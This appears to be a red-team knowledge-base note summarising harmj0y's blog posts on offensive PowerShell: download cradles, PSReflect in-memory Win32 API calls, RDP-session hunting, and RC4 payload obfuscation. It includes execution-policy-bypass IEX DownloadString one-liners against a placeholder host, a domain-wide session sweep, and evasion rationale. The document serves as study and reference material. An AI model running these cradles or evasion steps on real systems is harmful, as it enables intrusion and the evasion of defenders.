---
title: PowerShell Offensive Tradecraft
aliases: [Offensive PowerShell, PowerShell Weaponization, PSReflect, PowerShell RC4, PowerQuinsta]
type: tool
domain: [windows-internals, red-team]
tags: [type/tool, domain/red-team, domain/windows-internals, attack/recon, attack/defense-evasion]
source: "[[Source - harmj0y blog]]"
source_url: https://blog.harmj0y.net/powershell/derbycon-powershell-weaponization/
verified: true
related: ["[[PowerView]]", "[[PowerUp]]", "[[Empire]]", "[[GhostPack]]", "[[Rubeus]]", "[[User Hunting]]", "[[LDAP Enumeration]]"]
created: 2026-06-07
updated: 2026-06-07
---

> [!summary]
> A set of building-block techniques for **weaponizing PowerShell on red-team ops**: getting payloads onto and running in memory (download cradles, agent-hosted scripts), accessing the raw **Win32 API from PowerShell** without touching disk (PSReflect), reusing those API hooks for stealthy enumeration (PowerQuinsta / RDP-session hunting), and rolling **pure-PowerShell crypto** (RC4) for payload/staging obfuscation.

## What it does
This note folds several harmj0y posts on offensive PowerShell tradecraft. The recurring themes are **in-memory execution** (no disk artifacts), **direct Win32 API access** (richer/faster than cmdlets, fewer external binaries), and **small obfuscated payloads**.

- **Weaponization / delivery (DerbyCon talk).** Four practical ways to run offensive PowerShell on a target, ordered roughly by tradecraft quality:
  1. Interactive shell/RDP with `powershell.exe -nop -exec bypass` and in-memory module loading.
  2. Download cradle: pull a script from a web server and `IEX` it straight into memory.
  3. Metasploit `post/windows/manage/powershell/exec_powershell` for automated deployment over an existing session.
  4. Agent/beacon-hosted execution — e.g. **Cobalt Strike 2.1** Beacon storing imported scripts in memory so cmdlets are loaded once, tab-complete, and never re-transported. Reframed under "offensive-in-depth": keep multiple delivery paths (VBScript, PowerShell, C/WinAPI, native CLI) for every objective.

- **Win32 API access (PSReflect).** Two evolutions of how PowerView reaches the Windows API:
  - *Old way:* `Add-Type` with inline C# — compiles via `csc.exe`, which **touches disk** (temp files) and can fail in locked-down environments.
  - *New way:* Matt Graeber's **PSReflect** — a `New-InMemoryModule` + `func`/`struct`/`field`/`Add-Win32Type` DSL that defines P/Invoke signatures and native structs entirely in memory, in a "C-like" syntax. Pointers are cast directly with `-as $StructType` (no `Marshal.PtrToStructure`). Reported ~10-20x faster than the prior PowerView implementation, with minimal disk artifacts. Demonstrated against `NetSessionEnum`, `NetShareEnum`, `NetWkstaUserEnum`, `OpenSCManager`.

- **PowerQuinsta (RDP-session enumeration).** A PowerView feature that reimplements `qwinsta.exe` (query RDP/RDS sessions on local or remote hosts) via the WTS APIs rather than parsing the EXE's text. Surfaces logged-on users, session type (console vs `rdp-tcp#N`), and originating client IP — directly useful for [[User Hunting]] / mapping admin trust relationships. Remote querying needs admin on the target. Exposed as **`Get-NetRDPSessions`**, pipeline-friendly so you can sweep every domain computer and export to CSV.

- **Pure-PowerShell RC4.** Implementing RC4 with no native .NET dependency, for lightweight payload/staging obfuscation in C2. Three flavors: a clean pipeline function, a minimized lambda, and a tweet-length (141-char) version. Built on the standard RC4 primitives: **KSA** (256-byte state init), **PRGA** (keystream via swaps), and **XOR** with the data.

## Key commands/functions

```powershell
# --- In-memory delivery / download cradle ---
powershell.exe -nop -exec bypass
IEX (New-Object Net.WebClient).DownloadString('http://<HOST>/<script>.ps1')

# one-liner load + run
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<HOST>/<script>.ps1'); <Function-Name>"

# Metasploit (over existing session)
# post/windows/manage/powershell/exec_powershell
```

```powershell
# --- PSReflect: in-memory Win32 API access (no Add-Type / no csc.exe) ---
$Mod = New-InMemoryModule -ModuleName Win32

$FunctionDefinitions = @(
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType()))
)
$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Netapi32 = $Types['netapi32']

# define a native struct
$SESSION_INFO_10 = struct $Mod SESSION_INFO_10 @{
    sesi10_cname = field 0 String -MarshalAs @('LPWStr')
    # ...
}

# cast a pointer straight to the struct (no Marshal.PtrToStructure)
$Info = $SomeIntPtr -as $SESSION_INFO_10
```

```powershell
# --- PowerQuinsta: RDP/RDS session hunting (admin needed for remote) ---
Get-NetRDPSessions -ComputerName <HOST>

# sweep the domain and export
Get-NetComputer | Get-NetRDPSessions | Export-Csv -NoTypeInformation rdp_sessions.csv
```

```powershell
# --- Pure-PowerShell RC4 (payload/staging obfuscation) ---
# proper pipeline function (ASCII byte arrays in/out)
$Data | ConvertTo-Rc4ByteStream -Key $KeyBytes

# minimized lambda form — $R encrypts/decrypts (RC4 is symmetric)
# tweet-length form is Unicode-packed and run via IEX
```

> [!note] Why it matters
> - **Disk avoidance / evasion:** PSReflect and `IEX` download cradles keep code in memory, sidestepping `csc.exe` temp files and on-disk script artifacts.
> - **Speed & fidelity:** calling Win32 directly beats shelling out to `net.exe`/`qwinsta.exe` and parsing text — faster and structured.
> - **Symmetry note:** RC4 is symmetric, so the same routine encrypts (staging) and decrypts (implant) — handy for tiny C2 payloads.

## Used in techniques
These primitives underpin much of the harmj0y toolset:
- [[PowerView]] — PSReflect is its API backbone; `Get-NetRDPSessions` (PowerQuinsta) and the Net* session/share/logged-on enumeration live here
- [[User Hunting]] — RDP-session + logged-on-user enumeration to locate target/admin sessions
- [[LDAP Enumeration]] — paired with API-based host enumeration for domain mapping
- [[PowerUp]] — also refactored onto PSReflect for diskless privesc auditing
- [[Empire]] / [[GhostPack]] / [[Rubeus]] — same offensive-PowerShell / in-memory-delivery and obfuscation philosophy

## Sources
- DerbyCon PowerShell Weaponization — https://blog.harmj0y.net/powershell/derbycon-powershell-weaponization/
- PowerShell and Win32 API Access (PSReflect) — https://blog.harmj0y.net/powershell/powershell-and-win32-api-access/
- PowerQuinsta — https://blog.harmj0y.net/powershell/powerquinsta/
- PowerShell RC4 — https://blog.harmj0y.net/powershell/powershell-rc4/
